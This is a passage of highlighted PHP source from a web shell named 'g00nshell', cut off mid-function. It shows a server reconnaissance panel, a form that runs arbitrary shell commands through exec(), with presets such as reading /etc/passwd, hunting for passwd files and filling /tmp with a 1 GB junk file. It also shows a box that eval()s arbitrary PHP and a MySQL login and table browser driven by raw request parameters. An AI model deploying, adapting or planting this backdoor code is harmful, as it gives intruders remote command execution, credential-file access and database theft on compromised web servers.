  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Uname:&amp;lt;/b&amp;gt; &amp;lt;span class=&#39;inf&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$uname</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Shell Directory:&amp;lt;/b&amp;gt; &amp;lt;span class=&#39;inf&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="nb">getcwd</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;div style=&#39;display:none&#39; id=&#39;info&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Current User:&amp;lt;/b&amp;gt; &amp;lt;span class=&#39;inf&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$curuser</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;ID:&amp;lt;/b&amp;gt; &amp;lt;span class=&#39;inf&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Safemode:&amp;lt;/b&amp;gt; &amp;lt;font color=&#39;red&#39;&amp;gt;ON&amp;lt;/font&amp;gt;&quot;</span><span class="p">);}</span>
  <span class="k">else</span><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Safemode:&amp;lt;/b&amp;gt; &amp;lt;font color=&#39;green&#39;&amp;gt;OFF&amp;lt;/font&amp;gt;&quot;</span><span class="p">);}</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Open Base Dir:&amp;lt;/b&amp;gt; &amp;lt;font color=&#39;red&#39;&amp;gt;ON&amp;lt;/font&amp;gt; [ &amp;lt;span class=&#39;inf&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/span&amp;gt; ]&quot;</span><span class="p">);}</span>
  <span class="k">else</span><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Open Base Dir:&amp;lt;/b&amp;gt; &amp;lt;font color=&#39;green&#39;&amp;gt;OFF&amp;lt;/font&amp;gt;&quot;</span><span class="p">);}</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Disabled functions:&amp;lt;/b&amp;gt; &quot;</span> <span class="o">.</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">));}</span>
  <span class="k">else</span><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Disabled functions:&amp;lt;/b&amp;gt; None&quot;</span><span class="p">);}</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">function_exists</span><span class="p">(</span><span class="nb">mysql_connect</span><span class="p">)){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;MySQL:&amp;lt;/b&amp;gt; &amp;lt;font color=&#39;green&#39;&amp;gt;ON&amp;lt;/font&amp;gt;&quot;</span><span class="p">);}</span>
  <span class="k">else</span><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;MySQL:&amp;lt;/b&amp;gt; &amp;lt;font color=&#39;red&#39;&amp;gt;OFF&amp;lt;/font&amp;gt;&quot;</span><span class="p">);}</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/div&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[ &amp;lt;a href=&#39;#hax&#39; onClick=</span><span class="se">\&quot;</span><span class="s2">document.getElementById(&#39;info&#39;).style.display = &#39;block&#39;;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;More&amp;lt;/a&amp;gt; ] &quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[ &amp;lt;a href=&#39;#hax&#39; onClick=</span><span class="se">\&quot;</span><span class="s2">document.getElementById(&#39;info&#39;).style.display = &#39;none&#39;;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Less&amp;lt;/a&amp;gt; ]&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;center&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;h3 align=&#39;center&#39;&amp;gt;Links&amp;lt;/h3&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]){</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$act</span> <span class="k">as</span> <span class="nv">$link</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[ &amp;lt;a href=&#39;?&quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;act=&quot;</span> <span class="o">.</span> <span class="nv">$capt</span><span class="p">[</span><span class="nv">$link</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39; target=&#39;frm&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$link</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/a&amp;gt; ] &quot;</span><span class="p">);}}</span>
  <span class="k">else</span><span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$act</span> <span class="k">as</span> <span class="nv">$link</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[ &amp;lt;a href=&#39;?act=&quot;</span> <span class="o">.</span> <span class="nv">$capt</span><span class="p">[</span><span class="nv">$link</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39; target=&#39;frm&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$link</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/a&amp;gt; ] &quot;</span><span class="p">);}}</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/center&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;hr&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;iframe name=&#39;frm&#39; style=&#39;width:100%; height:65%; border:0;&#39; src=&#39;?act=files&#39;&amp;gt;&amp;lt;/iframe&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;pre style=&#39;text-align:center&#39;&amp;gt;:: g00nshell &amp;lt;font color=&#39;red&#39;&amp;gt;v&quot;</span> <span class="o">.</span> <span class="nv">$version</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/font&amp;gt; ::&amp;lt;/pre&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">cmd</span><span class="p">(){</span> <span class="c1">// Command execution function</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;form name=&#39;CMD&#39; method=&#39;POST&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;b&amp;gt;Command:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;input name=&#39;cmd&#39; type=&#39;text&#39; size=&#39;50&#39;&amp;gt; &quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;select name=&#39;precmd&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="nv">$precmd</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;Read /etc/passwd&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;cat /etc/passwd&#39;</span><span class="p">,</span><span class="s1">&#39;Open ports&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;netstat -an&#39;</span><span class="p">,</span>
                  <span class="s1">&#39;Running Processes&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;ps -aux&#39;</span><span class="p">,</span> <span class="s1">&#39;Uname&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;uname -a&#39;</span><span class="p">,</span> <span class="s1">&#39;Get UID&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;id&#39;</span><span class="p">,</span>
                  <span class="s1">&#39;Create Junkfile (/tmp/z)&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;dd if=/dev/zero of=/tmp/z bs=1M count=1024&#39;</span><span class="p">,</span>
                  <span class="s1">&#39;Find passwd files&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;find / -type f -name passwd&#39;</span><span class="p">);</span>
  <span class="nv">$capt</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$precmd</span><span class="p">);</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$precmd</span> <span class="k">as</span> <span class="nv">$c</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;option value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$c</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$capt</span><span class="p">[</span><span class="nv">$c</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/select&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;input type=&#39;submit&#39; value=&#39;Execute&#39;&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/form&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">){</span><span class="nv">$x</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];}</span>
  <span class="k">elseif</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;precmd&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">){</span><span class="nv">$x</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;precmd&#39;</span><span class="p">];}</span>
  <span class="k">else</span><span class="p">{</span><span class="k">die</span><span class="p">();}</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Results: &amp;lt;br&amp;gt;&amp;lt;textarea rows=20 cols=100&amp;gt;&quot;</span><span class="p">);</span>
  <span class="nv">$cmd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$x</span><span class="p">,</span> <span class="nv">$result</span><span class="p">);</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="nv">$line</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">execphp</span><span class="p">(){</span> <span class="c1">// PHP code execution function</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;h4&amp;gt;Execute PHP Code&amp;lt;/h4&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;form method=&#39;POST&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;textarea name=&#39;phpexec&#39; rows=5 cols=100&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phpexec&#39;</span><span class="p">]){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;/*Don&#39;t include &lt;? ?&gt; tags*/</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
  <span class="k">echo</span><span class="p">(</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phpexec&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/textarea&amp;gt;</span><span class="se">\n</span><span class="s2">&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;input type=&#39;submit&#39; value=&#39;Execute&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/form&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phpexec&#39;</span><span class="p">]){</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;textarea rows=10 cols=100&amp;gt;&quot;</span><span class="p">);</span>
    <span class="k">eval</span><span class="p">(</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phpexec&#39;</span><span class="p">]));</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">sqllogin</span><span class="p">(){</span> <span class="c1">// MySQL login function</span>
  <span class="nb">session_start</span><span class="p">();</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;isloggedin&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;true&quot;</span><span class="p">){</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: ?act=sql&quot;</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;form method=&#39;post&#39; action=&#39;?act=sql&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;User:&amp;lt;br&amp;gt;&amp;lt;input type=&#39;text&#39; name=&#39;un&#39; size=&#39;30&#39;&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Password:&amp;lt;br&amp;gt;&amp;lt;input type=&#39;text&#39; name=&#39;pw&#39; size=&#39;30&#39;&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Host:&amp;lt;br&amp;gt;&amp;lt;input type=&#39;text&#39; name=&#39;host&#39; size=&#39;30&#39; value=&#39;localhost&#39;&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Port:&amp;lt;br&amp;gt;&amp;lt;input type=&#39;text&#39; name=&#39;port&#39; size=&#39;30&#39; value=&#39;3306&#39;&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;input type=&#39;submit&#39; value=&#39;Login&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/form&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">die</span><span class="p">();</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">sql</span><span class="p">(){</span> <span class="c1">// General SQL Function</span>
  <span class="nb">session_start</span><span class="p">();</span>
  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlf&#39;</span><span class="p">]){</span><span class="nx">style</span><span class="p">();}</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;un&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pw&#39;</span><span class="p">]){;</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_user&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;un&#39;</span><span class="p">];</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_password&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pw&#39;</span><span class="p">];</span>
  <span class="p">}</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]){</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];}</span>
  <span class="k">else</span><span class="p">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;}</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">]){</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_port&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];}</span>
  <span class="k">else</span><span class="p">{</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_port&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;3306&#39;</span><span class="p">;}</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_user&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_password&#39;</span><span class="p">]){</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$sqlcon</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;:&#39;</span> <span class="o">.</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_port&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_user&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_password&#39;</span><span class="p">]))){</span>
      <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_user&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_password&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_port&#39;</span><span class="p">]);</span>
      <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Invalid credentials&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
      <span class="k">die</span><span class="p">(</span><span class="nx">sqllogin</span><span class="p">());</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
      <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;isloggedin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;true&quot;</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span><span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="nx">sqllogin</span><span class="p">());</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">]){</span>
    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">],</span> <span class="nv">$sqlcon</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlquery&#39;</span><span class="p">]){</span>
      <span class="nv">$dat</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlquery&#39;</span><span class="p">],</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
      <span class="nv">$num</span> <span class="o">=</span> <span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$dat</span><span class="p">);</span>
      <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$num</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
        <span class="k">echo</span><span class="p">(</span><span class="nb">mysql_result</span><span class="p">(</span><span class="nv">$dat</span><span class="p">,</span> <span class="nv">$i</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlf&#39;</span><span class="p">]){</span>
      <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;a href=&#39;?act=sql&amp;db=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;db&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;table=&quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;sqlf=ins&#39;&amp;gt;Insert Row&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
      <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;table border=&#39;1&#39;&amp;gt;&quot;</span><span class="p">);</span>
      <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SHOW COLUMNS FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">];</span>
      <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
      <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="nv">$fields</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
      <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">)){</span>
        <span class="nb">array_push</span><span class="p">(</span><span class="nv">$fields</span><span class="p">,</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;Field&#39;</span><span class="p">]);</span>
        <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;th&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$fields</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
        <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;table&#39;</span><span class="p">],</span> <span class="nv">$sqlcon</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
      <span class="nv">$num_rows</span> <span class="o">=</span> <span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">());</span>
      <span class="nv">$y</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
      <span class="k">for</span><span class="p">(</span><span class="nv">$x</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$x</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">=</span><span class="nv">$num_rows</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span><span class="nv">$x</span><span class="o">++</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]){</span>
          <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]){</span>
